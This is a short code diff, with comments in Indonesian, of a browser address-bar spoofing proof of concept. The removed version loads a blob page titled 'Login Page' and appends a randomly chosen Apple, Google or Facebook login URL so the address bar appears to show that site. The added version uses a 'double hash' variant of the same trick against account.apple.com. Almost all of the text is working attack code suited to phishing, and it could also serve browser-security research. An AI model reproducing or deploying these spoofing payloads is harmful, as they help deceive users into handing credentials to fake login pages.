@@ -1,15 +1,5 @@
 <script>
-// Pilih target spoofing
-targets = [
-    'x#https://www.account.apple.com',
-    'x#https://accounts.google.com', 
-    'x#https://facebook.com/login'
-];
-
-// Buat blob content
-content = `<html><body><h1>Login Page</h1><p>Address bar spoofed</p></body></html>`;
-blob = new Blob([content], {type: 'text/html'});
-
-// Redirect dengan random target
-location = URL.createObjectURL(blob) + '#?' + targets[Math.floor(Math.random() * targets.length)];
+// Technique 1: Double Hash (##)
+blob = new Blob(['<html><body><h1>Double Hash</h1></body></html>'], {type: 'text/html'});
+location = URL.createObjectURL(blob) + '##https://www.account.apple.com';
 </script>
